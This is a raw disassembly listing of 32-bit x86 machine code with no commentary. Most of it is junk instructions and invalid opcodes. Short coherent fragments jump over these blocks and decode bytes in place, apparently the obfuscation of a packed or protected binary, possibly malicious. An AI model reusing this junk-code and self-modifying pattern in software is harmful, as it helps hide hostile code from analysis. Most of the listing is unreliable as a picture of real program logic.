  402914:	les    edx,FWORD PTR [esi]
  402916:	lds    ebp,FWORD PTR [eax+0x53]
  402919:	mov    ch,0x57
  40291b:	out    dx,al
  40291c:	inc    ebx
  40291d:	call   0xf3ff5190
  402922:	cmc    
  402923:	shl    DWORD PTR [ecx+0x44],0xff
  402927:	call   0x74debd88
  40292c:	push   esi
  40292d:	mov    cs,WORD PTR [ecx]
  40292f:	jg     0x4028b3
  402931:	popa   
  402932:	int3   
  402933:	(bad)  
  402934:	sbb    bh,BYTE PTR [edx+0x22737e5b]
  40293a:	inc    edi
  40293b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40293c:	inc    esp
  40293d:	adc    esp,0xfffffff1
  402940:	pop    esi
  402941:	retf   
  402942:	test   BYTE PTR [eax-0x4],al
  402945:	jmp    FWORD PTR [ecx+0x1e]
  402948:	out    dx,al
  402949:	adc    al,0xb2
  40294b:	rcr    DWORD PTR [ecx-0x17],cl
  40294e:	test   eax,0xbc5b64cb
  402953:	xchg   ebx,eax
  402954:	cmp    BYTE PTR [ebx-0x6d40ee6],al
  40295a:	jge    0x4029b7
  40295c:	push   0x32d8fe93
  402961:	mov    cl,0xa8
  402963:	pop    es
  402964:	jb     0x402941
  402966:	cs mov edx,ebp
  402969:	push   ss
  40296a:	push   0x42244f22
  40296f:	mov    cl,0x4a
  402971:	aad    0xb2
  402973:	ficomp DWORD PTR [ebx]
  402975:	dec    ebp
  402976:	repnz fist WORD PTR [edi]
  402979:	sar    BYTE PTR [esi-0x6b],cl
  40297c:	adc    DWORD PTR [esp+edi*8],0x55
  402980:	push   esp
  402981:	push   ecx
  402982:	jge    0x4029cf
  402984:	lock lods eax,DWORD PTR ds:[esi]
  402986:	outs   dx,DWORD PTR ds:[esi]
  402987:	fs xchg ebx,eax
  402989:	cld    
  40298a:	push   ebp
  40298b:	int    0xea
  40298d:	ss fsub st(5),st
  402990:	push   ebx
  402991:	xchg   ebp,eax
  402992:	mov    esi,0xf02e8bdb
  402997:	push   bx
  402999:	cwde   
  40299a:	or     ecx,DWORD PTR [esi]
  40299c:	rcr    BYTE PTR [ecx-0x35],1
  40299f:	adc    edx,DWORD PTR [ecx]
  4029a1:	ss cmc 
  4029a3:	sbb    eax,0xfa5c570e
  4029a8:	mov    edi,0xab4a2c6a
  4029ad:	add    DWORD PTR [edi+0x73],eax
  4029b0:	push   edx
  4029b1:	cdq    
  4029b2:	lods   eax,DWORD PTR ds:[esi]
  4029b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029b4:	pop    ebx
  4029b5:	mov    esp,0x5a88a91f
  4029ba:	call   0x31929511
  4029bf:	nop
  4029c0:	fxch   st(7)
  4029c2:	inc    esp
  4029c3:	pusha  
  4029c4:	adc    eax,0xaff901ab
  4029c9:	out    0x9c,eax
  4029cb:	ficomp WORD PTR [edi+0x40]
  4029ce:	inc    esi
  4029cf:	xchg   edi,eax
  4029d0:	sub    al,0x5a
  4029d2:	dec    ebx
  4029d3:	and    DWORD PTR [eax+eax*2],ebp
  4029d6:	clc    
  4029d7:	sub    BYTE PTR [edx-0x7edd6267],0xc3
  4029de:	outs   dx,WORD PTR ds:[esi]
  4029e0:	fisub  WORD PTR [ecx+0x48]
  4029e3:	lea    eax,[eax]
  4029e5:	cmp    eax,0x5d6afef3
  4029ea:	or     al,0xd9
  4029ec:	test   DWORD PTR [edi+0x23],esp
  4029ef:	jmp    0x28e4:0x9496140c
  4029f6:	inc    esp
  4029f7:	xchg   edi,eax
  4029f8:	push   ebp
  4029f9:	dec    ecx
  4029fa:	jo     0x402a53
  4029fc:	dec    edx
  4029fd:	jo     0x402a14
  4029ff:	xlat   BYTE PTR ds:[ebx]
  402a00:	jno    0x40298c
  402a02:	dec    esi
  402a03:	pop    esp
  402a04:	mov    dl,0x26
  402a06:	cmp    al,0xef
  402a08:	int    0xcf
  402a0a:	mov    esi,0x8f3d8d4a
  402a0f:	aad    0xdd
  402a11:	dec    ecx
  402a12:	mov    al,0x8b
  402a14:	inc    ebp
  402a15:	aam    0xf
  402a17:	test   DWORD PTR [ebx],eax
  402a19:	add    BYTE PTR [eax],al
  402a1b:	add    BYTE PTR [ebx-0x39cc0fbb],cl
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	mov    bl,al
  402a36:	lahf   
  402a37:	out    dx,al
  402a38:	stos   BYTE PTR es:[edi],al
  402a39:	or     eax,0x7ffa7e7e
  402a3e:	jle    0x402abe
  402a40:	ins    BYTE PTR es:[edi],dx
  402a41:	sub    ebp,eax
  402a43:	adc    al,0x18
  402a45:	or     bh,BYTE PTR [ebp+ebx*8+0x5b13a109]
  402a4c:	dec    esi
  402a4d:	(bad)  
  402a4e:	inc    ebp
  402a4f:	test   BYTE PTR [edi+eiz*1],dh
  402a52:	sti    
  402a53:	test   al,dl
  402a55:	mov    al,0xe
  402a57:	cmp    al,0x58
  402a59:	popf   
  402a5a:	punpckhwd mm6,QWORD PTR [ebp-0x3a]
  402a5e:	arpl   cx,cx
  402a60:	outs   dx,DWORD PTR ds:[esi]
  402a61:	or     cl,BYTE PTR [ebx]
  402a63:	jns    0x402a20
  402a65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a66:	adc    al,0xf
  402a68:	cmc    
  402a69:	dec    esp
  402a6a:	add    eax,0x469135ec
  402a6f:	mov    edi,0x9664472e
  402a74:	lock (bad) 
  402a76:	lahf   
  402a77:	sub    al,0x51
  402a79:	jmp    0x402a1f
  402a7b:	jmp    0x5ecbd1cf
  402a80:	mov    esi,0x4e815d17
  402a85:	mov    edx,0x85faa96f
  402a8a:	inc    esi
  402a8b:	lods   eax,DWORD PTR ds:[esi]
  402a8c:	push   cs
  402a8d:	fisub  DWORD PTR [eax-0x38fcc30d]
  402a93:	cmp    eax,0xf617fd17
  402a98:	mov    esi,DWORD PTR [edx-0x6e]
  402a9b:	repnz gs adc al,0xf6
  402a9f:	push   ebp
  402aa0:	adc    eax,0xa1ea1474
  402aa5:	aad    0x0
  402aa7:	inc    eax
  402aa8:	inc    esp
  402aa9:	push   ebp
  402aaa:	add    DWORD PTR [ebp-0x75c3e4b3],ebx
  402ab0:	addr16 push ds
  402ab2:	mov    dh,0xdf
  402ab4:	dec    edx
  402ab5:	push   es
  402ab6:	pop    esp
  402ab7:	mov    dl,al
  402ab9:	out    0xeb,al
  402abb:	(bad)  
  402abc:	sub    eax,0x36001e4
  402ac1:	or     ch,BYTE PTR [eax+0x671aa678]
  402ac7:	icebp  
  402ac8:	xor    cl,BYTE PTR [esi-0x69]
  402acb:	stc    
  402acc:	cmp    al,0xf
  402ace:	call   0x8022:0x81e65b1
  402ad5:	lea    eax,[edx]
  402ad7:	loop   0x402b11
  402ad9:	fnstenv ds:0xcf8b96e
  402adf:	repnz mov bh,0x18
  402ae2:	push   0xffffffcb
  402ae4:	inc    ecx
  402ae5:	mov    edi,0x80cada5
  402aea:	bound  esp,QWORD PTR [ebp-0x2de6a3f6]
  402af0:	cmp    ecx,esi
  402af2:	test   BYTE PTR [ecx-0x66],dh
  402af5:	pop    esi
  402af6:	loop   0x402b0b
  402af8:	sub    al,0xb7
  402afa:	call   0xe796:0xd9f6af01
  402b01:	arpl   WORD PTR [edx-0x4f18b5e2],di
  402b07:	lods   eax,DWORD PTR ds:[esi]
  402b08:	lea    edi,[ecx]
  402b0a:	dec    edx
  402b0b:	out    0xce,eax
  402b0d:	cmp    BYTE PTR [esi+0xa40be99],0xb5
  402b14:	mov    bh,0x66
  402b16:	aad    0xcb
  402b18:	stc    
  402b19:	ins    BYTE PTR es:[edi],dx
  402b1a:	outs   dx,DWORD PTR ds:[esi]
  402b1b:	stc    
  402b1c:	push   ds
  402b1d:	jl     0x402aa7
  402b1f:	and    DWORD PTR [ebx+0x2],ebp
  402b22:	mov    eax,0x1f1afcbc
  402b27:	dec    esi
  402b28:	test   DWORD PTR [esi-0x5d],0xf05ae66e
  402b2f:	fmul   QWORD PTR [esi+ecx*1+0x1b285117]
  402b36:	and    BYTE PTR [ebx+0x3273bc6f],dl
  402b3c:	mov    ch,0x1d
  402b3e:	je     0x402aca
  402b40:	jb     0x402afa
  402b42:	(bad)  
  402b43:	fdivr  DWORD PTR [edx-0x58]
  402b46:	inc    edx
  402b47:	lahf   
  402b48:	std    
  402b49:	push   ss
  402b4a:	jne    0x402b9b
  402b4c:	jbe    0x402ba9
  402b4e:	popf   
  402b4f:	xor    al,BYTE PTR [ebx+0x7448f365]
  402b55:	cmp    edi,esi
  402b57:	mov    al,0x4a
  402b59:	mov    DWORD PTR [ecx+0x45],ebx
  402b5c:	fstp   DWORD PTR [ecx+0x53]
  402b5f:	push   cs
  402b60:	adc    ah,0xc6
  402b63:	popa   
  402b64:	dec    ebp
  402b65:	jns    0x402b48
  402b67:	les    esi,FWORD PTR [esi]
  402b69:	sub    eax,0x3a580657
  402b6e:	push   ebx
  402b6f:	retf   
  402b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b71:	mov    dh,0x89
  402b73:	or     esi,DWORD PTR [edi]
  402b75:	nop
  402b76:	or     ch,BYTE PTR [edx]
  402b78:	ja     0x402bc5
  402b7a:	jmp    0xd8f8a8e6
  402b7f:	sub    BYTE PTR [eax-0xfd524be],cl
  402b85:	pop    es
  402b86:	xchg   esi,eax
  402b87:	push   0x52
  402b89:	add    eax,DWORD PTR [ebp+ebx*8+0x8]
  402b8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b8e:	sub    ecx,DWORD PTR [ecx]
  402b90:	fs into 
  402b92:	mov    dl,0x6
  402b94:	jle    0x402be1
  402b96:	lods   al,BYTE PTR ds:[esi]
  402b97:	jae    0x402b64
  402b99:	cmp    eax,0xc32922d
  402b9e:	stc    
  402b9f:	sub    ebx,edx
  402ba1:	mov    gs,esi
  402ba3:	inc    eax
  402ba4:	pop    es
  402ba5:	pop    ebp
  402ba6:	dec    edi
  402ba7:	pop    esi
  402ba8:	jae    0x402b5a
  402baa:	shl    bl,1
  402bac:	(bad)  
  402bad:	xchg   edi,eax
  402bae:	xor    al,0x8f
  402bb0:	clc    
  402bb1:	loop   0x402c24
  402bb3:	sbb    DWORD PTR [esi-0x77],esp
  402bb6:	(bad)  
  402bb7:	xlat   BYTE PTR ds:[ebx]
  402bb8:	xlat   BYTE PTR ds:[ebx]
  402bb9:	stc    
  402bba:	cmp    BYTE PTR [ebx-0x4fa5a6e8],bh
  402bc0:	dec    eax
  402bc1:	push   ebp
  402bc2:	dec    eax
  402bc3:	add    DWORD PTR [ebp+0x28840fc0],0x0
  402bca:	add    BYTE PTR [eax],al
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	and    BYTE PTR [edx-0x63],0x7d
  402c15:	or     edi,DWORD PTR ss:[esi+0x7e]
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402be1
  402c1e:	jl     0x402c92
  402c20:	pop    ds
  402c21:	shl    ch,1
  402c23:	xor    eax,0xf8235331
  402c28:	or     al,0xf
  402c2a:	cmp    ch,BYTE PTR [esi+0x31fb53e0]
  402c30:	in     al,0x25
  402c32:	into   
  402c33:	add    al,0x7c
  402c35:	fisubr WORD PTR [ebx-0x6d]
  402c38:	or     ch,BYTE PTR [ebx-0xae6791]
  402c3e:	call   0xe8d5:0x5ef88f89
  402c45:	cmc    
  402c46:	aas    
  402c47:	xchg   edi,eax
  402c48:	inc    edi
  402c49:	out    dx,eax
  402c4a:	sbb    ebp,DWORD PTR [ebx+0x4c]
  402c4d:	push   esp
  402c4e:	jns    0x402bde
  402c50:	enter  0xc0d5,0x4f
  402c54:	lods   eax,DWORD PTR ds:[esi]
  402c55:	fmul   st(7),st
  402c57:	in     al,dx
  402c58:	adc    dl,BYTE PTR [ecx-0x34]
  402c5b:	imul   ecx,ebp,0xdf6c285c
  402c61:	pop    esp
  402c62:	push   0xfffffff3
  402c64:	js     0x402cb8
  402c66:	mov    ds:0xea7b315d,al
  402c6b:	aad    0xc6
  402c6d:	cmp    dl,0x3
  402c70:	aaa    
  402c71:	popa   
  402c72:	and    BYTE PTR [edi],0x88
  402c75:	fstp   DWORD PTR [esi]
  402c77:	xor    al,0xc9
  402c79:	(bad)  
  402c7a:	mov    eax,DWORD PTR [ebx]
  402c7c:	add    BYTE PTR [ebx-0x26fc5884],ch
  402c82:	fsubr  st,st(4)
  402c84:	sub    bl,0x7c
  402c87:	aas    
  402c88:	mov    ah,0x81
  402c8a:	in     al,dx
  402c8b:	xor    edi,DWORD PTR [esi-0x3d]
  402c8e:	and    eax,0xea46a806
  402c93:	or     esp,DWORD PTR [edi+0x10d9cc59]
  402c99:	jns    0x402c46
  402c9b:	das    
  402c9c:	ins    DWORD PTR es:[edi],dx
  402c9d:	and    eax,DWORD PTR [edi-0x28]
  402ca0:	inc    esp
  402ca1:	xchg   ebp,eax
  402ca2:	mov    ah,0x9
  402ca4:	fimul  DWORD PTR [edi+0x6d1f18ca]
  402caa:	cmp    bl,bh
  402cac:	jb     0x402cc5
  402cae:	jno    0x402c40
  402cb0:	fild   DWORD PTR [ecx-0x11f0234c]
  402cb6:	sar    BYTE PTR [edi+0x2b37893],1
  402cbc:	adc    al,bh
  402cbe:	sti    
  402cbf:	iret   
  402cc0:	(bad)  
  402cc1:	mov    bh,BYTE PTR [esi+0x31]
  402cc4:	jg     0x402c6b
  402cc6:	inc    ebp
  402cc7:	test   DWORD PTR [ebp-0x6d],esp
  402cca:	clc    
  402ccb:	int3   
  402ccc:	xchg   edi,eax
  402ccd:	mov    ?,WORD PTR ds:0x8ea82fe
  402cd3:	ins    BYTE PTR es:[edi],dx
  402cd4:	and    al,0x70
  402cd6:	mov    WORD PTR [edi],ss
  402cd8:	int3   
  402cd9:	or     BYTE PTR [esi],cl
  402cdb:	cmp    al,0xf
  402cdd:	jmp    0xa2fba810
  402ce2:	jne    0x402d63
  402ce4:	push   ecx
  402ce5:	xchg   edx,eax
  402ce6:	inc    edx
  402ce7:	data16 stos BYTE PTR es:[edi],al
  402ce9:	fisttp QWORD PTR [ebx]
  402ceb:	or     cl,BYTE PTR [edx+0x21b0f108]
  402cf1:	and    edi,DWORD PTR [edi+0x70bbe730]
  402cf7:	retf   0xf320
  402cfa:	hlt    
  402cfb:	inc    ebx
  402cfc:	cs mov esp,ecx
  402cff:	dec    eax
  402d00:	daa    
  402d01:	fwait
  402d02:	mov    edx,0x8e8e5ba6
  402d07:	cmp    eax,0xb1c83b61
  402d0c:	adc    dl,BYTE PTR [ebx+0x27]
  402d0f:	sub    eax,DWORD PTR [ecx]
  402d11:	sbb    BYTE PTR [edx],dl
  402d13:	int    0xd5
  402d15:	sub    eax,0x3efba8c2
  402d1a:	lahf   
  402d1b:	xchg   edi,eax
  402d1c:	mov    ecx,0xc01400f
  402d21:	std    
  402d22:	xor    eax,0xedc4e46d
  402d27:	jp     0x402ce0
  402d29:	xor    DWORD PTR [esi],ebx
  402d2b:	pop    ds
  402d2c:	sbb    BYTE PTR [ebp+edi*4+0x382c1678],bl
  402d33:	dec    edx
  402d34:	cli    
  402d35:	push   0x2f
  402d37:	ret    0xc103
  402d3a:	jne    0x402d54
  402d3c:	int    0x19
  402d3e:	mov    esp,0x8b08882f
  402d43:	jne    0x402cda
  402d45:	and    ebx,DWORD PTR [edx-0x7792813d]
  402d4b:	in     eax,dx
  402d4c:	jecxz  0x402d24
  402d4e:	and    esi,DWORD PTR [edi+ebp*2+0x43940184]
  402d55:	push   ebx
  402d56:	dec    edx
  402d57:	dec    esp
  402d58:	pop    ds
  402d59:	mov    BYTE PTR es:[eax+0xe804e5d],dl
  402d60:	aam    0x99
  402d62:	js     0x402d77
  402d64:	mov    dh,0x6f
  402d66:	push   edi
  402d67:	aaa    
  402d68:	adc    esp,DWORD PTR [ebx-0x6d]
  402d6b:	push   ebx
  402d6c:	loopne 0x402da2
  402d6e:	call   0x6160aebd
  402d73:	outs   dx,DWORD PTR ds:[esi]
  402d74:	cld    
  402d75:	sar    DWORD PTR [ebx-0x75cfc312],cl
  402d7b:	jle    0x402d37
  402d7d:	into   
  402d7e:	out    0x71,al
  402d80:	je     0x402d1f
  402d82:	pop    es
  402d83:	loopne 0x402e01
  402d85:	jb     0x402d62
  402d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d88:	stos   BYTE PTR es:[edi],al
  402d89:	cmp    BYTE PTR [edx-0x57],0x80
  402d8d:	and    dl,cl
  402d8f:	ret    
  402d90:	pushf  
  402d91:	pop    es
  402d92:	rol    BYTE PTR [esp+ecx*8],0xd3
  402d96:	les    ebp,FWORD PTR ds:0x8d2ab701
  402d9c:	popf   
  402d9d:	mov    esp,0x2bb6a2e1
  402da2:	inc    ebp
  402da3:	cld    
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [eax+ebx*2+0x4f],1
  402de7:	je     0x402dbb
  402de9:	mov    dl,0x8
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e67
  402df2:	dec    ecx
  402df3:	hlt    
  402df4:	jl     0x402da6
  402df6:	test   eax,0xecac9fb4
  402dfb:	lods   eax,DWORD PTR ds:[esi]
  402dfc:	in     al,0xbe
  402dfe:	jne    0x402df2
  402e00:	(bad)  [edx+edi*4]
  402e03:	bound  ebx,QWORD PTR [edx]
  402e05:	popf   
  402e06:	loope  0x402d91
  402e08:	out    dx,eax
  402e09:	mov    dh,0xcb
  402e0b:	imul   ecx,DWORD PTR [ecx+0x210f4085],0x0
  402e12:	dec    ecx
  402e13:	pop    eax
  402e14:	sbb    BYTE PTR [esi+eax*4-0x85d157f],dh
  402e1b:	and    esp,edx
  402e1d:	cmp    esp,DWORD PTR [ebx+ebp*4+0x35d5eaab]
  402e24:	jl     0x402e0e
  402e26:	cld    
  402e27:	sahf   
  402e28:	hlt    
  402e29:	sbb    ecx,DWORD PTR [esi]
  402e2b:	jp     0x402dba
  402e2d:	(bad)  
  402e2e:	cli    
  402e2f:	cmp    BYTE PTR [eax-0x152f1b79],al
  402e35:	les    esi,FWORD PTR [ebx-0x167393b]
  402e3b:	loope  0x402de6
  402e3d:	aam    0xea
  402e3f:	out    0xa,al
  402e41:	aaa    
  402e42:	in     eax,dx
  402e43:	adc    al,0xfa
  402e45:	mov    fs,WORD PTR [esi+esi*4]
  402e48:	mov    ?,WORD PTR [ecx-0x26]
  402e4b:	outs   dx,BYTE PTR ds:[esi]
  402e4c:	dec    edi
  402e4d:	shr    BYTE PTR [eax+0x12],0xd3
  402e51:	jo     0x402e35
  402e53:	inc    edi
  402e54:	mov    eax,0x30ff311c
  402e59:	ja     0x402e67
  402e5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e5c:	imul   ebp,DWORD PTR [ebx+ebp*4-0x47],0x63d03fe2
  402e64:	popf   
  402e65:	test   BYTE PTR [eax+0x1f],0x29
  402e69:	mov    ds:0x1d996b8e,al
  402e6e:	in     eax,0xd9
  402e70:	jl     0x402dfd
  402e72:	push   esi
  402e73:	call   0x6f4e8de7
  402e78:	cmp    DWORD PTR [ebp+0x24260b11],eax
  402e7e:	out    dx,eax
  402e7f:	sahf   
  402e80:	dec    ebp
  402e81:	fs (bad) 
  402e83:	or     ebp,DWORD PTR [ebx]
  402e85:	fdiv   DWORD PTR [esi+0x28]
  402e88:	mov    WORD PTR [esi],es
  402e8a:	adc    DWORD PTR [edx],eax
  402e8c:	fidiv  DWORD PTR [eax+edi*2]
  402e8f:	add    BYTE PTR [edx],bh
  402e91:	push   esp
  402e92:	outs   dx,BYTE PTR ds:[esi]
  402e93:	push   0x1720a939
  402e98:	and    ecx,DWORD PTR [edi+eax*4+0x2]
  402e9c:	cmp    dl,BYTE PTR [eax]
  402e9e:	jo     0x402e62
  402ea0:	mov    bh,0xeb
  402ea2:	aam    0xe
  402ea4:	push   edx
  402ea5:	dec    ecx
  402ea6:	mov    bh,0xc3
  402ea8:	push   edi
  402ea9:	lds    ebp,FWORD PTR [eax+0x6e6b9328]
  402eaf:	sbb    eax,0x31d92348
  402eb4:	adc    DWORD PTR [ebp+0x20],esp
  402eb7:	(bad)
  402eba:	sar    eax,cl
  402ebc:	ds in  eax,dx
  402ebe:	shl    DWORD PTR [ecx+esi*2],1
  402ec1:	out    dx,al
  402ec2:	outs   dx,BYTE PTR ds:[esi]
  402ec3:	js     0x402e99
  402ec5:	adc    DWORD PTR [eax+0x4dd55a42],0x1abfbdef
  402ecf:	scas   eax,DWORD PTR es:[edi]
  402ed0:	mov    ?,WORD PTR [ecx-0x27]
  402ed3:	iret   
  402ed4:	lahf   
  402ed5:	adc    esp,edi
  402ed7:	cmp    al,0xff
  402ed9:	push   esi
  402eda:	sti    
  402edb:	aaa    
  402edc:	push   0xa14d9427
  402ee1:	pusha  
  402ee2:	call   0x94bf:0xccd39a24
  402ee9:	icebp  
  402eea:	stos   DWORD PTR es:[edi],eax
  402eeb:	jne    0x402f2f
  402eed:	in     eax,dx
  402eee:	loopne 0x402f46
  402ef0:	pusha  
  402ef1:	aaa    
  402ef2:	dec    ebx
  402ef3:	fadd   QWORD PTR [eax-0x48]
  402ef6:	jns    0x402ebb
  402ef8:	push   eax
  402ef9:	jns    0x402ebd
  402efb:	sti    
  402efc:	fwait
  402efd:	sub    ecx,esi
  402eff:	sub    BYTE PTR [esp+eiz*4-0xc92155b],cl
  402f06:	popf   
  402f07:	jle    0x402f5c
  402f09:	fs popfw 
  402f0c:	jnp    0x402f51
  402f0e:	inc    DWORD PTR [edi]
  402f10:	adc    al,0xe7
  402f13:	(bad)  
  402f14:	sub    DWORD PTR [edi-0x66],ebx
  402f17:	inc    ebp
  402f18:	fbstp  TBYTE PTR [ebp-0x6d]
  402f1b:	adc    al,0x99
  402f1d:	icebp  
  402f1e:	sbb    BYTE PTR [eax-0x79],al
  402f21:	adc    bh,dh
  402f23:	leave  
  402f24:	in     al,0x83
  402f26:	stos   BYTE PTR es:[edi],al
  402f27:	(bad)  
  402f29:	sbb    al,0xf4
  402f2b:	fisttp QWORD PTR [ebx-0x49]
  402f2e:	pop    es
  402f2f:	jge    0x402eb9
  402f31:	and    bl,BYTE PTR [edi]
  402f33:	dec    esp
  402f34:	aam    0x1c
  402f36:	imul   ebp,ecx,0x74
  402f39:	inc    ebp
  402f3a:	sahf   
  402f3b:	dec    ebx
  402f3c:	scas   eax,DWORD PTR es:[edi]
  402f3d:	outs   dx,BYTE PTR ds:[esi]
  402f3e:	popa   
  402f3f:	std    
  402f40:	pushf  
  402f41:	adc    ah,BYTE PTR [ebp-0x70]
  402f44:	jns    0x402f5f
  402f46:	add    edi,DWORD PTR [ecx+ebx*2]
  402f49:	mov    ch,0xca
  402f4b:	in     eax,dx
  402f4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f4d:	push   ds
  402f4e:	mov    dl,BYTE PTR [edx+0x62]
  402f51:	dec    esp
  402f52:	popf   
  402f53:	add    BYTE PTR [esi-0x7b36581],al
  402f59:	sbb    BYTE PTR [ebx],0x2e
  402f5c:	mov    esi,0xc7b82945
  402f61:	xchg   esp,eax
  402f62:	push   edi
  402f63:	xchg   esp,eax
  402f64:	push   eax
  402f65:	outs   dx,BYTE PTR ds:[si]
  402f67:	dec    edx
  402f68:	aam    0x54
  402f6a:	inc    eax
  402f6b:	popa   
  402f6c:	fdiv   QWORD PTR [ebx+eax*8-0x52]
  402f70:	or     DWORD PTR [eax+0x37],ebx
  402f73:	iret   
  402f74:	push   esp
  402f75:	lea    eax,ds:0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi-0x4405a49]
  402fae:	xchg   ecx,eax
  402faf:	sub    al,0x3e
  402fb1:	push   ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x40301e
  402fb9:	xchg   BYTE PTR cs:[ebp*2+0x51e8a092],ah
  402fc1:	in     al,0xe8
  402fc3:	in     eax,dx
  402fc4:	shr    BYTE PTR [ecx+eiz*2+0x18],1
  402fc8:	cwde   
  402fc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fca:	jnp    0x402fae
  402fcc:	fdivr  DWORD PTR [ecx+0x1852deb8]
  402fd2:	imul   eax,esi,0xffffff9e
  402fd5:	push   0x66
  402fd7:	mov    edx,DWORD PTR [edx+ebp*2-0x50122b3a]
  402fde:	mov    ecx,0x102be171
  402fe3:	or     ebp,edx
  402fe5:	add    eax,0x5ca673d1
  402fea:	pop    ecx
  402feb:	pop    esi
  402fec:	add    BYTE PTR [eax],dh
  402fee:	leave  
  402fef:	jmp    0x42de:0x144c9ece
  402ff6:	pop    ebx
  402ff7:	nop
  402ff8:	push   edx
  402ff9:	dec    esp
  402ffa:	push   esi
  402ffb:	shr    DWORD PTR [eax-0x37],cl
  402ffe:	jno    0x403019
  403000:	mov    ah,0xcb
  403002:	sub    DWORD PTR [edi-0x46],edi
  403005:	xor    BYTE PTR [ecx+eiz*8-0x55],0xe5
  40300a:	enter  0x7e7a,0xd5
  40300e:	xor    esi,esi
  403010:	sbb    DWORD PTR [eax],edx
  403012:	push   esp
  403013:	lea    esp,[ebp-0x40cfa77b]
  403019:	inc    ecx
  40301a:	imul   esi,DWORD PTR [edi],0x2f
  40301d:	out    dx,eax
  40301e:	fld    DWORD PTR [eax-0x1a77c401]
  403024:	ret    
  403025:	scas   eax,DWORD PTR es:[edi]
  403026:	push   ebp
  403027:	mov    eax,ds:0xd4aa8d3e
  40302c:	xchg   edi,eax
  40302d:	add    esi,esi
  40302f:	pop    esi
  403030:	(bad)  
  403031:	(bad)  
  403032:	pop    ds
  403033:	cmp    DWORD PTR [edi+esi*4-0x56],eax
  403037:	adc    BYTE PTR [ecx+0x4de057d0],0x8d
  40303e:	jle    0x402fc0
  403040:	push   0x51
  403042:	mov    ah,0x9f
  403044:	outs   dx,BYTE PTR ds:[esi]
  403045:	(bad)  [ebp-0x65]
  403048:	push   ecx
  403049:	rcl    BYTE PTR [edx-0x1148574a],cl
  40304f:	pop    edi
  403050:	sahf   
  403051:	cmp    ecx,ebp
  403053:	mov    edi,DWORD PTR [eax]
  403055:	mov    BYTE PTR [ebx],dl
  403057:	jno    0x403096
  403059:	xor    BYTE PTR ds:0x6471e0fc,0x89
  403060:	fistp  DWORD PTR [edi-0x63]
  403063:	hlt    
  403064:	mov    BYTE PTR [ebx-0x2889297b],dl
  40306a:	ret    
  40306b:	test   DWORD PTR [edx+0x71],eax
  40306e:	jae    0x4030e1
  403070:	sti    
  403071:	inc    DWORD PTR [eax+0x766ef7fd]
  403077:	fsub   QWORD PTR [ebp-0x24060e14]
  40307d:	dec    ebx
  40307e:	push   esi
  40307f:	aad    0xb2
  403081:	mov    al,0x74
  403083:	mov    ebx,0x109fdb5c
  403088:	gs mov ebx,0x3ff45d44
  40308e:	dec    esp
  40308f:	dec    ebp
  403090:	jecxz  0x40310f
  403092:	dec    edx
  403093:	push   edx
